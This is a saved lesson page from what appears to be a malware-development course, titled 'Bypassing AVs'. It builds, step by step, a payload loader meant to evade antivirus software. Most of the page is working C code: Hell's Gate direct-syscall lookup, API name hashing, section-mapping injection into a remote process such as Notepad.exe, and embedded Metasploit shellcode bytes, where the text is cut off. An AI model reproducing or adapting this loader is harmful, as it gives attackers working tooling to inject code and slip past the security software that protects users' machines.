<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Bypassing%20AVs_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Bypassing%20AVs_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Bypassing%20AVs_files/css2.css" rel="stylesheet">
        <link href="Bypassing%20AVs_files/css2_002.css" rel="stylesheet">
        <title>Bypassing AVs</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Bypassing%20AVs_files/app.fdbb573b.css"><link rel="stylesheet" href="Bypassing%20AVs_files/app.fdbb573b.css"><link rel="stylesheet" href="Bypassing%20AVs_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Bypassing%20AVs_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 81 - Bypassing AVs
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Bypassing%20AVs_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Bypassing%20AVs_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Bypassing%20AVs_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/Bypassing-AVs" target="_blank">
                    <img src="Bypassing%20AVs_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Bypassing AVs</h2>
<h3>Introduction</h3>
<p>So far, numerous methods and techniques to create and execute a 
payload loader that can bypass a variety of software security programs 
have been demonstrated. This module will work to construct a 
feature-rich payload loader from the ground up to reinforce what has 
been taught in the previous modules.</p>
<p>Create an empty Visual Studio project and follow along to keep up with this module.</p>
<h3>Payload Loader Features</h3>
<p>The implemented payload loader will have the following features:</p>
<ul>
<li>Remote code injection support</li>
<li>Mapping injection using direct syscalls via Hell's Gate</li>
<li>API Hashing</li>
<li>Anti-Analysis functionality</li>
<li>RC4 payload encryption</li>
<li>Brute forcing the decryption key</li>
<li>No CRT library imports</li>
</ul>
<h3>Hell's Gate Setup</h3>
<p>This loader utilizes payload injection via direct syscalls obtained using Hell's Gate. To begin, one must create <code>Structs.h</code>, <code>HellsGate.c</code> and <code>HellAsm.asm</code> files. These files include the necessary functions to execute direct syscalls. The <code>Structs.h</code>
 file is used to save Windows undocumented structures and is included in
 subsequent C files. It contains structure definitions such as <code>PEB</code>, <code>TEB</code>, and more, which are necessary for implementing Hell's Gate.</p>
<p>The <code>HellAsm.asm</code> file will be the same as the one from the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank">repository</a>. As for <code>HellsGate.c</code>, it will have the following functions.</p>
<p><strong>HellsGate.c</strong></p>
<pre><code>#include &lt;Windows.h&gt;
#include "Structs.h"


PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}


BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);
	if (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions   = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
	PDWORD pdwAddressOfNames       = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

	for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
		PCHAR pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry-&gt;uHash) {
			pVxTableEntry-&gt;pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, &lt;syscall&gt;
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	if (pVxTableEntry-&gt;wSystemCall != NULL)
		return TRUE;
	else
		return FALSE;
}

</code></pre>
<p>The code above does not have the <code>VX_TABLE_ENTRY</code> structure or the <code>djb2</code> function defined. To solve this, two new files will be created: <code>WinApi.c</code> and <code>Common.h</code>.</p>
<ul>
<li>
<p><code>WinApi.c</code> - This file is used to store the CRT library 
replacement functions and the string hashing functions used in Hell's 
Gate and the API Hahsing implementation.</p>
</li>
<li>
<p><code>Common.h</code> - This file provides common function prototypes
 to enable calling a function from a different file, as well as custom 
structure definitions, hashes values of the syscalls, and WinAPIs.</p>
</li>
</ul>
<p>The <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L92" target="_blank">djb2</a> string hashing function is replaced with the following <code>HashStringJenkinsOneAtATime32BitA/W</code> functions, hence changing the original string hashing algorithm used in Hell's Gate.</p>
<p><strong>WinApi.c</strong></p>
<pre><code>#include &lt;Windows.h&gt;

#include "Structs.h"
#include "Common.h"


UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}
</code></pre>
<p><strong>Common.h</strong></p>
<pre><code>#pragma once

#include &lt;Windows.h&gt;

// Seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

// These are function prototypes - functions are defined in 'HellsGate.c'
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

// These are functions prototypes - functions are defined in 'HellAsm.asm'
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();
</code></pre>
<p>Define the <code>VX_TABLE_ENTRY</code> in the <code>Common.h</code> file, then update the <code>HellsGate.c</code> file to include it and utilize <code>HASHA</code> instead of <code>djb2</code> as the hashing function.</p>
<p><strong>VX_TABLE_ENTRY</strong></p>
<pre><code>typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
</code></pre>
<h3>Calculating Syscall Hashes</h3>
<p>A new project must be created in order to calculate the hash values of the syscalls used and print them to the console. The <code>Hasher</code> project will have one C file which is shown below.</p>
<p><strong>Hasher.c</strong></p>
<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;


#define STR "_JOAA"
#define INITIAL_SEED 8


UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}



int main() {

	printf("#define %s%s \t0x%0.8X \n", "NtCreateSection", STR, HashStringJenkinsOneAtATime32BitA("NtCreateSection"));
	printf("#define %s%s \t0x%0.8X \n", "NtMapViewOfSection", STR, HashStringJenkinsOneAtATime32BitA("NtMapViewOfSection"));
	printf("#define %s%s \t0x%0.8X \n", "NtUnmapViewOfSection", STR, HashStringJenkinsOneAtATime32BitA("NtUnmapViewOfSection"));
	printf("#define %s%s \t0x%0.8X \n", "NtClose", STR, HashStringJenkinsOneAtATime32BitA("NtClose"));
	printf("#define %s%s \t0x%0.8X \n", "NtCreateThreadEx", STR, HashStringJenkinsOneAtATime32BitA("NtCreateThreadEx"));
	printf("#define %s%s \t0x%0.8X \n", "NtWaitForSingleObject", STR, HashStringJenkinsOneAtATime32BitA("NtWaitForSingleObject"));
  
  return 0;
}
</code></pre>
<h4>Hasher Results</h4>
<p>Once compiled and ran, the program will generate the following results which should be copied to the <code>Common.h</code> file.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-116769871-25449179-cdfb-412b-899f-1744ac77246b.png" alt="image"></p>
<p>Additionally, the new <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14" target="_blank">VX_TABLE</a> structure definition must be updated to include the syscalls that will be utilized.</p>
<pre><code>typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;

} VX_TABLE, * PVX_TABLE;

</code></pre>
<h3>Payload Injection Via Hell's Gate</h3>
<p>With Hell's Gate successfully set up, the payload injection implementation can be made. A new file will be created, <code>Inject.c</code> which is shown below.</p>
<p>The following points briefly explain the <code>Inject.c</code> file:</p>
<ul>
<li>
<p><code>InitializeSyscalls</code> - This function initializes the global <code>g_Sys</code> variable of type <code>VX_TABLE</code> to be used later on.</p>
</li>
<li>
<p><code>RemoteMappingInjectionViaSyscalls</code> - This function supports both local and remote mapping injection via the <code>bLocal</code> parameter which is set to <code>TRUE</code> to inject the payload locally, or <code>FALSE</code> for remote injection.</p>
<ul>
<li>If the <code>bLocal</code> parameter is set to <code>TRUE</code>, the <code>dwLocalFlag</code> variable will be set to <code>PAGE_EXECUTE_READWRITE</code> to be suitable for local payload execution, and the second <code>NtMapViewOfSection</code> will be avoided. But if <code>bLocal</code> is <code>FALSE</code>, the <code>dwLocalFlag</code> will remain <code>PAGE_READWRITE</code> and the function will run the second <code>NtMapViewOfSection</code> call to allocate memory remotely.</li>
<li>The <code>pExecAddress</code> variable is used to save the base 
address of the injected payload. It is equal to the base address of the 
locally injected payload (<code>pLocalAddress</code>) if the function is set to execute the payload locally, or the remote injected payload base address (<code>pRemoteAddress</code>) if the function is set to execute the payload remotely.</li>
<li>The <code>pExecAddress</code> variable will be then passed to the <code>NtCreateThreadEx</code> syscall to execute the payload whenever it was.</li>
</ul>
</li>
</ul>
<p><strong>Inject.c</strong></p>
<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;


#include "Structs.h"
#include "Common.h"

// global `VX_TABLE` structure
VX_TABLE 	g_Sys = { 0 };



BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash       = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash    = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash  = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash               = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash      = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;

	// initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
		return FALSE;



	return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

        HANDLE          hSection          = NULL;
        HANDLE          hThread           = NULL;
        PVOID           pLocalAddress     = NULL,
                        pRemoteAddress    = NULL,
                        pExecAddress      = NULL;
        NTSTATUS        STATUS            = NULL;
        SIZE_T          sViewSize         = NULL;
        LARGE_INTEGER   MaximumSize       = {
              .HighPart = 0,
              .LowPart = sPayloadSize
        };

        DWORD           dwLocalFlag       = PAGE_READWRITE;

	//--------------------------------------------------------------------------
    // Allocating local map view 
	HellsGate(g_Sys.NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if (bLocal) {
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}

	HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);

	//--------------------------------------------------------------------------
    // Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);

	//--------------------------------------------------------------------------
        // Allocating remote map view 
        if (!bLocal) {

          HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
          if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
            printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
            return FALSE;
          }

          printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);

        }

	//--------------------------------------------------------------------------
    // Executing the payload via thread creation
    pExecAddress = pRemoteAddress;
	if (bLocal) {
		pExecAddress = pLocalAddress;
	}
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
	HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	//--------------------------------------------------------------------------
    // Waiting for the thread to finish
	HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
	if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	// Unmapping the local view
	HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

    // Closing the section handle
	HellsGate(g_Sys.NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h4>Process Enumeration</h4>
<p>In order to create a complete process injection module, the usage of the <code>NtQuerySystemInformation</code> syscall is required to fetch a target process handle, as outlined in the <em>Process Enumeration - NtQuerySystemInformation</em> module.</p>
<p>The use of a new syscall will require the <code>VX_TABLE</code> structure to be updated to include one more element, <code>VX_TABLE_ENTRY NtQuerySystemInformation</code> for it to be initialized by the <code>InitializeSyscalls</code> function. Additionally, use the <code>Hasher</code> program to calculate a hash value for the "NtQuerySystemInformation" string.</p>
<pre><code>BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

	ULONG					    uReturnLen1 		= NULL,
						        uReturnLen2 		= NULL;
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo 	= NULL;
	PVOID					    pValueToFree 	= NULL;
	NTSTATUS				    STATUS 			= NULL;

	// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that's ok, because we need to know how much to allocate (uReturnLen1)
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	// Since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// Calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	while (TRUE) {

		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; HASHW(SystemProcInfo-&gt;ImageName.Buffer) == HASHW(szProcName)) {
			// Opening a handle to the target process and saving it, then breaking 
			*pdwPid = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
			break;
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo-&gt;NextEntryOffset)
			break;

		// Moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
	}

	// Freeing using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Checking if we got the target's process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h3>Main Function</h3>
<p>To test the code so far, create <code>main.c</code> which will contain the entry point function of the loader along with the usual Msfvenom calc payload.</p>
<p>The following points briefly explain the main function:</p>
<ul>
<li>
<p>The <code>InitializeSyscalls</code> function is the first function to be called. All other functions depend on it to initialize the syscall structure.</p>
</li>
<li>
<p>If <code>TARGET_PROCESS</code> is defined, <code>GetRemoteProcessHandle</code> is called to retrieve the target process handle and pass its output to <code>RemoteMappingInjectionViaSyscalls</code>.</p>
</li>
<li>
<p>If <code>TARGET_PROCESS</code> is not defined, the code directly calls <code>RemoteMappingInjectionViaSyscalls</code> with a pseudo value to the local process handle (<code>-1</code>), instructing it to inject the payload locally.</p>
</li>
</ul>
<p><strong>main.c</strong></p>
<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;


#include "Structs.h"
#include "Common.h"


// comment to inject to the local process
//
#define TARGET_PROCESS	L"Notepad.exe"


// x64 calc metasploit
unsigned char Payload [] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
